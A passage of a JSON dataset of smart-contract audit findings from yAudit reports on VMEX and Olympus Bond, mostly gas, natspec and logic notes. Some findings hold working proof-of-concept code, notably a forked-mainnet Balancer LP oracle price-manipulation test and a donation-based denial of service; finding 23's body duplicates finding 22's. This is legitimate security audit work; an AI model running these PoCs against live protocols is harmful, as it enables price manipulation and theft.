        "body": "checkAmount() uses unchecked to verify if requested borrow amount does not breach borrowCap: unchecked { require( totalDebt + amount <= borrowCap * 10**decimals, Errors.VL_BORROW_CAP_EXCEEDED ); } RHS will work as borrowCap will be set such that it's not possible to overflow unless you set it really high which will be an error on the part of the global admin. In general, unless you have a proof that this won't overflow or if the overflow is desired, then only unchecked should be used.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "25. Use abi.encodeCall instead of abi.encodeWithSelector",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "New aTokens are deployed as follows: address aTokenProxyAddress = _initTokenWithProxy( addressesProvider.getATokenBeacon(), abi.encodeWithSelector( IInitializableAToken.initialize.selector, cachedPool, address(this), //lendingPoolConfigurator address address(addressesProvider), // input.underlyingAsset, trancheId ) ); Here is the function signature of AToken.initialize(): function initialize( ILendingPool pool, InitializeTreasuryVars memory vars ) external override initializer {",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "26. setAssetAllowed(asset, false) logic allows DoS attack",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "If setPermissionlessTranches(true) is called, claimTrancheId() can be called by anyone, therefore creating a new tranche. In the method setAssetAllowed(), if isAllowed == false, the check validateAssetAllowed() will be run: function setAssetAllowed(address asset, bool isAllowed) external onlyGlobalAdmin{ ... if (!isAllowed) { validateAssetAllowed(asset); } ... } function validateAssetAllowed(address asset) internal view { ... for (uint64 tranche = 0; tranche < totalTranches; tranche++) { ... } } Each iteration will cost some gas, if there are too many tranches whether it is under a normal scenario or an attack, this function will use too much gas and will not be callable creating a DoS.",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "27. Balancer LP fair price can be manipulated for illiquid pools",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "The BNum.bpow() function returns accurate values down to 1e-6 (1e12 in wei). Below that, the result is larger than expected. Here is a code snippet that shows this: function testBpow() public { uint exp = 0.5*1e18; uint bpowRes; uint expectedRes; uint base; uint ratio; for (uint i=0; i<=18; i+=2) { base = 10**i; bpowRes = BNum.bpow(base, exp); expectedRes = 10**(i/2 + 9); ratio = bpowRes/expectedRes; console.log(\"- (1e%d)^0.5 bpow/expected: %d\", i, ratio); } } which will print: Logs: - (1e0)^0.5 bpow/expected: 399293 - (1e2)^0.5 bpow/expected: 39929 - (1e4)^0.5 bpow/expected: 3992 - (1e6)^0.5 bpow/expected: 399 - (1e8)^0.5 bpow/expected: 39 - (1e10)^0.5 bpow/expected: 4 - (1e16)^0.5 bpow/expected: 1 - (1e18)^0.5 bpow/expected: 1 In BalancerOracle.computeFairReserves() the ratio variable is around 1e18 for balanced pools (NOTE: This is only true when the pool tokens have 18 decimals, but decimals are discussed in another finding and the related fix will make it true for all tokens). If a pool has low liquidity then it is possible to swap a large amount to make it unbalanced and manipulate the fair price. Note that in order to impact the fair price the reserve ratio must become 1e-6 or less (1e12 in wei), meaning that an attacker should have to swap an amount of at least 1000 times the current pool reserves. Also, multiple swaps must be performed to bypass Balancer's check on maximum swapped amount making the manipulation gas expensive. For these reasons, it seems unlikely that an attacker can manipulate the LP collateral price profitably. Here is a PoC of the manipulation on the ETH-UNI Mainnet pool: function testManip() public { address pool = 0x5Aa90c7362ea46b3cbFBD7F01EA5Ca69C98Fef1c; //UNI-ETH pool on mainnet uint UNI_price = 5.15*1e8; // UNI-USDC chainlink price uint ETH_price = 1800*1e8; // ETH-USDC chainlink price console.log(\"Mainnet block:\", block.number); uint256[] memory prices = new uint256[](2); prices[0] = UNI_price; prices[1] = ETH_price; // direct LP price calculation bytes32 pool_id = IBalancer(pool).getPoolId(); IVault balancer_vault = IBalancer(pool).getVault(); (IERC20[] memory tokens, uint256[] memory balances, ) = balancer_vault.getPoolTokens(pool_id); uint totPoolUSDCvalue = UNI_price*balances[0]/1e18 + ETH_price*balances[1]/1e18; uint LPprice = totPoolUSDCvalue*(10**IBalancer(pool).decimals())/IBalancer(pool).totalSupply(); console.log(\"LP expected price:\", LPprice); // use Balancer Oracle to get LP price uint LPoraclePrice = BalancerOracle.get_lp_price(pool, prices, 0, true); console.log(\"LP oracle price before manipulation:\", LPoraclePrice); // Swap 100_000 ETH on pool uint amount = 1e5*1e18; vm.deal(address(this), amount); IWETH9(address(tokens[1])).deposit{value:1e5*1e18}(); IWETH9(address(tokens[1])).approve(address(balancer_vault), amount); // 1. Swap WETH for UNI FundManagement memory funds = FundManagement( { sender: address(this), fromInternalBalance: false, recipient: payable(address(this)), toInternalBalance: false } ); bytes memory userData; SingleSwap memory singleSwap = SingleSwap( { poolId: pool_id, kind: SwapKind(0), assetIn: address(tokens[1]), assetOut: address(tokens[0]), amount: amount, userData: userData } ); while (true) { // do multiple swaps because balancer limit swap amount to 30% of reserves (, balances, ) = balancer_vault.getPoolTokens(pool_id); amount = balances[1]*3/10; // maximum that can be swapped due to balancer limits if (IWETH9(address(tokens[1])).balanceOf(address(this)) < amount) break; singleSwap.amount = amount; IBalancerVault(address(balancer_vault)).swap(singleSwap, funds, 0, block.timestamp + 1); } LPoraclePrice = BalancerOracle.get_lp_price(pool, prices, 0, true); console.log(\"LP oracle price after manipulation:\", LPoraclePrice); } which will print: Logs: Mainnet block: 17251326 LP expected price: 9752931061 LP oracle price before manipulation: 9752695445 LP oracle price after manipulation: 91173235346 The full PoC is available here: https://gist.github.com/bahurum/67ef6ea9ea820108844b320c977a3c34",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "28. Fetching the decimals is only required once",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "DistributionManager.sol#L53",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "29. Price oracle is fetched on every iteration of the loop",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "GenericLogic.sol#L220",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "30. oracle is retrieved twice in LendingPoolCollateralManager's _calculateAvailableCollateralToLiquidate()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "The oracle is retrieved twice to calculate the debtAssetPrice and collateralPrice",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "31. onlyLendingPoolConfigurator in aToken is unused",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "onlyLendingPoolConfigurator in aToken is unused.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "32. Cache storage variable outside loop",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "LendingPool.sol#L576: address[] memory _activeReserves = new address[]( trancheParams[trancheId].reservesCount ); for (uint256 i = 0; i < trancheParams[trancheId].reservesCount; i++) { _activeReserves[i] = _reservesList[trancheId][i]; } Here trancheParams[trancheId].reservesCount is read multiple times.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "33. Redundant checks on Chainlink oracle",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "getOracleAssetPrice() validates the price as follows: if (price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) && block.timestamp - updatedAt < SECONDS_PER_DAY) { return uint256(price); } else { return _fallbackOracle.getAssetPrice(asset); } As explained about price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) is always true.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "34. addressesProvider.getLendingPool() can be cached outside of the loop",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "AssetMappings.sol#L67",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "35. private variable _addressesTranche is unnecessarily nested",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "_addressesTranche is defined as mapping(bytes32 => mapping(uint64 => address)) private _addressesTranche; This variable is only used to store the admin address for a tranche. _addressesTranche is accessed in several functions setTrancheAdmin(), addTrancheAdmin() and getAddressTranche() which is itself called by the onlyTrancheAdmin().",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "36. Ensure that the borrowCap and supplyCap doesn't include decimals",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "borrowCap is assumed to not have decimals in it as indicated by its usage ValidationLogic.sol#L145: require( totalDebt + amount <= borrowCap * 10**decimals, Errors.VL_BORROW_CAP_EXCEEDED ); That's the case with supplyCap too: require( supplyCap == 0 || (IAToken(reserve.aTokenAddress).totalSupply() + amount) <= supplyCap * (10**_assetMappings.getDecimals(asset)), Errors.VL_SUPPLY_CAP_EXCEEDED ); Hence, global admin has to make sure that borrowCap and supplyCap does not include the decimals. Otherwise, an absurdly high amount can be borrowed or lent.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "37. Rewards can be greater than REWARDS_VAULT balance",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "IncentivesController.sol#L159",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "38. Two instances of DistributionTypes.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "math/DistributionTypes.sol types/DistributionTypes.sol",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "39. Incorrect Natpsec for getRewardsData()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "The last return parameter of getRewardsData() is incorrect.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "40. Be cautious when integrating an ERC20 token",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "Before integrating a token with Vmex protocol, make sure to do a careful review of the token. You can take a look at past hacks that have happened due to non-standard token impelmenetation: weird-erc20.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "41. Extra comment in ValidationLogic's validateTransfer() function",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "This commented out code can be removed.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "42. On-Chain price manipulation",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "43. AToken initialize is missing a space on aTokenName",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "AToken.sol#L106",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "44. Not used imports",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "DefaultReserveInterestRateStrategy.sol#L8",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "45. Natspec of setBorrowingEnabled() is wrong",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "AssetMappings.sol#L130",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "46. A user can be both whitelisted and blacklisted",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "LendingPool.sol#L83 UserConfiguration.sol#L130 UserConfiguration.sol#L157",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "47. Limiting Incentives to Prevent Gas Shortages in Incentivized Assets",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "DistributionManager.sol#L130",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "48. Document missing call to aToken.handleRepayment()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "Aave V2's repay() calls handleRepayment() on the corresponding aToken: IERC20(asset).safeTransferFrom(msg.sender, aToken, paybackAmount); IAToken(aToken).handleRepayment(msg.sender, paybackAmount); <-- // missing from Vmex emit Repay(asset, onBehalfOf, msg.sender, paybackAmount); Here is the corresponding Vmex's repay(): IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, paybackAmount); emit Repay(asset, trancheId, onBehalfOf, msg.sender, paybackAmount); However, handleRepayment() is a noop as it calls to an empty function, so it doesn't affect the functionality.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "49. Incomplete Natspec for calculateUserAccountData()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "GenericLogic.sol#L179",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "50. Incorrect comment in PercentMath.sol",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "PercentageMath.sol#L21",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "51. Oracle updates bricked for Beethoven boosted pools",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "VMEXOracle.getBeethovenPrice(), when dealing with boosted pools, checks whether the first address in the boosted pools token list is the address of the pool itself, which is the case for some boosted pools (e.g.: pool 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd, as can be seen in the following screenshot). PoC pragma solidity 0.8.19; import \"forge-std/Test.sol\"; import \"forge-std/console.sol\"; interface Vault { function getPoolTokens(bytes32) external view returns(IERC20[] memory tokens, uint256[] memory balances, uint256); } interface IBalancer { function getPoolId() external returns (bytes32 poolID); } interface IERC20 {} Vault constant vault = Vault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); address constant ETH_NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; address constant WETH = 0x4200000000000000000000000000000000000006; contract PoC is Test { address[3] assets = [ 0xb1C9aC57594e9B1EC0f3787D9f6744EF4CB0A024, 0xde45F101250f2ca1c0f8adFC172576d10c12072D, 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd ]; VmexStub vmex; function setUp() external { vm.createSelectFork(\"https://endpoints.omniatech.io/v1/op/mainnet/public\"); vmex = new VmexStub(); } function test_IndexOutOfBoundsPoC() external { vm.expectRevert(); vmex.getAssetPrice(assets[2]); } } contract VmexStub { address[3] assets = [ 0xb1C9aC57594e9B1EC0f3787D9f6744EF4CB0A024, 0xde45F101250f2ca1c0f8adFC172576d10c12072D, 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd ]; function getBeethovenPriceStub(address asset) internal returns(uint256) { bytes32 poolId = IBalancer(asset).getPoolId(); ( IERC20[] memory tokens, , ) = vault.getPoolTokens(poolId); uint256 i = 0; if(address(tokens[0]) == asset) { //boosted tokens first token is itself i = 1; } uint256[] memory prices = new uint256[](tokens.length-i); while(i 0); i++; } // ... return prices[0]; } function getAssetPrice(address asset) public returns(uint256) { if (assets[0] != asset && assets[1] != asset && assets[2] != asset) { // if asset is a base type return mock price return 0x01; } else { // else we're managing a beethoven lp return getBeethovenPriceStub(asset); } } } If this condition holds, the function attempts to skip over the first token of the list by setting an index variable i = 1. The issue with this is that right after, the prices array is initialized as uint256[] memory prices = new uint256[](tokens.length - 1) and then a loop is performed while i < tokens.length: within the loop body, the code retrieves stores prices[i] = getAssetPrice(). At the final iteration, when i = tokens.length - 1, the write to prices[tokens.length - 1] will fail with an Index out of bounds exception.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "52. UserConfiguration.isEmpty() is always false for whitelisted or blacklisted users",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "UserConfiguration.isEmpty() checks if UserConfiguration Map is empty with: return self.data == 0; The first 2 bits of self.data are for blacklisting and whitelisting, so if a user is whitelisted or blacklisted, isEmpty() will return false even if he has no assets. This does not impact GenericLogic.calculateUserAccountData() where isEmpty() is used, since userConfig.isUsingAsCollateralOrBorrowing(vars.i) will always be false and vars.totalCollateralInETH will be 0. The value returned will be (0, 0, 0, 0, type(uint256).max, 0) despite the issue.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "53. Events not emitted for important state changes",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "When changing state variables, events are not emitted. Emitting events allows off-chain monitoring. setPermissionlessTranches() and addWhitelisterAddress() don't emit events.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "54. Unused inherited Ownable contract",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "55. Incorrect interface used",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "Instead of using IERC20 interface in _deposit() function while checking the users asset balance IATOKEN interface is used DepositWithdrawLogic.sol vars.amount = IAToken(vars.asset).balanceOf(msg.sender);",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "56. Natspec about the distribution of interest between depositors, pool owners, and Vmex in DefaultReserveInterestRateStrategy.sol is incorrect",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "The comment states that the interest given to the pool admin treasury is equal to borrow interest rate * reserve factor * (1 - VMEX Reserve Factor). However, the pool admin treasury receives borrow interest rate * reserve factor as seen in the _mintToTreasury function.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "57. Dos due to _checkNoLiquidity()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "_checkNoLiquidity() checks if available liquidity is equal to zero. An attacker can send 1 wei of asset to the aToken address, which would cause a revert. This would make it impossible for the global admin to deactivate the reserve and tranche admin to set collateralEnabled to false. function _checkNoLiquidity(address asset, uint64 trancheId) internal view { DataTypes.ReserveData memory reserveData = pool.getReserveData( asset, trancheId ); uint256 availableLiquidity = IERC20Detailed(asset).balanceOf( reserveData.aTokenAddress ); require( availableLiquidity == 0 && reserveData.currentLiquidityRate == 0, Errors.LPC_RESERVE_LIQUIDITY_NOT_0 ); }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "58. Blacklisted users are considered by the system to have active borrows",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "As a part of the changes to the AAVE v2 protocol, VMEX added whitelist/blacklist functionality. A user's inclusion in these lists is determined by the most significants bits in their UserConfiguration.data bitmap. Consider the most significant bits below, as well the way that isBorrowingAny() is performed: UserConfiguration.data whitelisted user 0b10000000000000000000000... blacklisted user 0b01000000000000000000000... BORROWING_MASK 0b01010101010101010101010... function isBorrowingAny(...) internal pure returns (bool): return self.data & BORROWING_MASK != 0; This will return true for a blacklisted user. Most of the other functions in UserConfiguration account for the added whitelist/blacklist most significant bits, but isBorrowingAny() does not. There is little impact to the system however, as isBorrowingAny() is only called at the beginning of GenericLogic.balanceDecreaseAllowed() to short circuit and return early to save gas. There is no risk from this that a user is borrowing and isBorrowingAny() returns they are not, just a false positive (i.e. they are blacklisted + not borrowing). This will then then be caught by either the !userConfig.isUsingAsCollateral(...) check, which will return accurately for the specific collateral, or the later check for if (vars.totalDebtInETH == 0) {return true;}. function balanceDecreaseAllowed(...) external returns (bool) { if ( !userConfig.isBorrowingAny() || !userConfig.isUsingAsCollateral( reservesData[params.asset][params.trancheId].id ) ) { return true; } ... (...,vars.totalDebtInETH,,...,,...) = calculateUserAccountData(...); if (vars.totalDebtInETH == 0) { return true; }",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "59. getFlags() and getFlagsMemory() will revert when asset is not active/allowed",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md",
        "body": "ReserveConfiguration.getFlags() is called to retrieve if a reserve is active, frozen and borrowable. However, if the asset is not active then it will revert because of a check in AssetMapping.getAssetBorrowable(): require(assetMappings[asset].isAllowed, Errors.AM_ASSET_NOT_ALLOWED);",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "1. Callback customization allows arbitrary contract execution",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "2. Missing logical protections in setIntervals()",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "3. BCV decrease design does not give market owner optimal price",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "4. totalDebt value overwritten",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Medium",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "5. Values grow quickly near end of market",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "6. Inaccurate assumption about scaleAdjustment",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "7. Anyone can trigger a market closure",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "8. Missing zero case checks",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "9. Incompatible with fee-on-transfer tokens",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Low",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "10. Use != 0 for gas savings",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "11. Unnecessary zero initialization",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "12. Use prefix in loops",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "There are several instances of this finding: https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L177 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L180 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L186 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L191 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/OlympusTreasuryCallback.sol#L74",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "13. Cache array length before loop",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "14. Bitshift is cheaper for powers of two",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "15. Remove unused functions from imported libraries",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "16. Remove unused variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "17. Cache variable for reuse",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "18. Tidy up _handlePayout logic",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "19. Redundant return variable",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "20. Use unchecked when no risk of overflow or underflow",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "21. Move variable assignment to avoid overwrite",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "22. Using simple comparison",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Gas",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "23. Bond purchase size does not impact price",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
        "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.",
        "labels": [
            "yAudit",
            "Severity: Informational",
            "Difficulty: n/a"
        ]
    },
    {
        "title": "24. Frontrunning changes price",
        "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md",
